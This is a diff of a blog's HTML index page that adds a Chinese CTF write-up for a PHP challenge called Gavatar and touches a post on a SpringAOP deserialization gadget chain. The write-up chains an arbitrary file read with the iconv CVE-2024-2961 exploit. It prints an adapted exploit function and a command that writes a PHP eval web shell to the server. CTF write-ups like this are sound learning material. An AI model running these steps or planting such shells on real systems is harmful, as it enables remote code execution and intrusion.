@@ -192,6 +192,58 @@
   <div class="single-container column is-centered">
     <div class="archive" id="post-container">
       <header class="post-header">
+        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/2025n1junior-wp/">[2025]N1junior-WP</a></h1>
+       
+       
+      </header>
+      <div class="post-content">
+        <div class="excerpt post-summary">
+          <h2 id="gavatar">Gavatar</h2>
+<p>一个php服务</p>
+<p>这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以</p>
+<pre tabindex="0"><code>if (!empty($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;])) {
+    $finfo = new finfo(FILEINFO_MIME_TYPE);
+    if (!in_array($finfo-&gt;file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;]), [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) {
+        die(&#39;Invalid file type&#39;);
+    }
+    move_uploaded_file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;], $avatarPath);
+} elseif (!empty($_POST[&#39;url&#39;])) {
+    $image = @file_get_contents($_POST[&#39;url&#39;]);
+    if ($image === false) die(&#39;Invalid URL&#39;);
+    file_put_contents($avatarPath, $image);
+}
+</code></pre><p>flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用</p>
+<p>也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用</p>
+<p><a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1">https://www.ambionics.io/blog/iconv-cve-2024-2961-p1</a></p>
+<p>因为不是直接返回文件内容，而是需要我们从<code>avatar.php</code>中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可</p>
+<pre tabindex="0"><code>    def download(self, path: str) -&gt; bytes:
+        &#34;&#34;&#34;Returns the contents of a remote file.
+        &#34;&#34;&#34;
+        path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
+        self.send(path)
+        response=self.session.get(&#34;http://39.106.16.204:20871/avatar.php?user=123&#34;)
+        print(response)
+        data = response.text
+        return base64.decode(data)
+</code></pre><p>然后跑exp就好了</p>
+<pre tabindex="0"><code>python test.py http://39.106.16.204:20871/upload.php &#34;echo &#39;&lt;?=@eval(\$_POST[0]);?&gt;&#39; &gt; shell.php&#34;
+</code></pre><p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png" alt="image-20250211210919337"></p>
+        </div>
+        
+        <div class="post-time-container">
+          <span class="post-time"> 2025-02-11 </span>
+        </div>
+      </div>
+      
+    </div>
+  </div>
+</article>
+
+    
+        <article class="post">
+  <div class="single-container column is-centered">
+    <div class="archive" id="post-container">
+      <header class="post-header">
         <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/springaop/">SpringAOP链学习</a></h1>
        
        
@@ -201,7 +253,7 @@
           <h2 id="前言">前言</h2>
 <p>在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下</p>
 <h2 id="正文">正文</h2>
-<p>依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类，可以说是和Jackson一样通杀springboot的链子了</p>
+<p>依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类</p>
 <h3 id="流程">流程</h3>
 <p>调用链如下</p>
 <pre tabindex="0"><code>JdkDynamicAopProxy.invoke()-&gt;
@@ -210,7 +262,7 @@ AspectJAroundAdvice-&gt;invoke-&gt;
 org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-&gt;
 method.invoke()
 </code></pre><p>执行类是<code>org.springframework.aop.aspectj.AbstractAspectJAdvice</code>的<strong>invokeAdviceMethodWithGivenArgs</strong>方法</p>
-<p>![image-20250123020448769](/Users/gsbp/Library/Application Support/typora-user-images/image-20250123020448769.png)</p>
+<p><img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123020448769.png" alt="image-20250123020448769"></p>
 <pre tabindex="0"><code>    protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {
         Object[] actualArgs = args;
         if (this.aspectJAdviceMethod.getParameterCount() == 0) {
